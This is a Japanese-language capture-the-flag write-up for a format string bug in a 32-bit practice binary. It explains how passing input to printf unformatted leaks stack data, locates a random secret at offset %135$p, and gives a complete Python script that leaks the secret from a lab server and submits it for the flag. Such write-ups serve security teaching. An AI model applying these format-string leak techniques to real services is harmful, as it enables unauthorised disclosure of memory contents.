# Writeup: 深層の証言 (Deep Testimony)

## 問題概要

サーバー上で動作するプログラムのバイナリと接続情報が与えられます。
プログラムはユーザーの入力をそのまま出力する機能を持っており、その後の秘密の値（乱数）を当てることでフラグが得られます。

## 配布ファイル分析

- `format`: 32-bit ELF実行ファイル (Not stripped)
- セキュリティ機構:
  - No PIE (0x8048000周辺にロード)
  - Stack Canaryあり (ただし今回はバッファオーバーフローではなくFSBなので直接関係なし)

## 脆弱性の分析

プログラムの挙動を確認すると、ユーザー入力後にその内容が表示されます。
`printf(buffer)` のように、フォーマット指定子を含まない形での `printf` 利用が推測されます。
これにより **Format String Bug (FSB)** の脆弱性が存在します。

FSBを利用すると、`%p` や `%x` などの指定子を入力することで、スタック上のデータをリークさせることができます。

逆アセンブル結果（またはヒューリスティックな解析）から、プログラムの流れは以下のようになっていることが分かります：

1. `srand(time(0))` で乱数シードを初期化。
2. `secret = rand()` で秘密の値を生成し、スタック上のローカル変数（`ebp-0x1c`）に保存。
3. `fgets` でユーザー入力を受け取り、`printf` で出力（ここでリークが可能）。
4. ユーザーに秘密の値の入力を求め、一致すればフラグを表示。

## 解法

攻撃の目標は、スタック上にある `secret` の値をリークし、それを回答として送信することです。

1. **オフセットの特定**:
   スタック上のどの位置に `secret` があるかを探します。
   `%p` を大量に入力してスタックの中身をダンプすると、ランダムに見える正の整数が見つかります。
   解析の結果、フォーマット文字列の引数から数えて **135番目** (`%135$p`) 付近に `secret` があることが特定できました。
   （環境によって多少前後する可能性がありますが、`0x1d...` や `0x7...` のようなランダム性の高い値が目印です）

2. **エクスプロイト**:
   Pythonスクリプトを使用してサーバーに接続し、以下の手順を実行します。
   - `%135$p` を送信して値をリーク。
   - リークされた16進数文字列を10進数の整数に変換。
   - その値をサーバーに送信。

## 解答スクリプト

```python
import socket
import time
import re

def solve():
    host = "10.2.0.5"
    port = 10000

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    # バナーとプロンプトの受信
    time.sleep(0.5)
    data = s.recv(4096).decode()
    print("Initial Data:", data)

    # ペイロード送信 (オフセット135にある値をリーク)
    payload = "%135$p\n"
    s.send(payload.encode())

    # リーク結果の受信
    time.sleep(0.5)
    data = s.recv(4096).decode()
    print("Leak Data:", data)

    # 値のパース
    match = re.search(r'(0x[0-9a-fA-F]+)', data)
    if match:
        hex_val = match.group(1)
        int_val = int(hex_val, 16)
        print(f"Leaked hex: {hex_val}, decimal: {int_val}")

        # 正解を送信
        s.send(f"{int_val}\n".encode())

        # フラグの受信
        time.sleep(1)
        final_data = s.recv(4096).decode()
        print("Final output:", final_data)
    else:
        print("Failed to parse leak")

    s.close()

if __name__ == "__main__":
    solve()
```

## 結果

```
Correct!
flag{f0rm4t_str1ng_l34k_1s_d4ng3r0us}
```

Flag: `flag{f0rm4t_str1ng_l34k_1s_d4ng3r0us}`
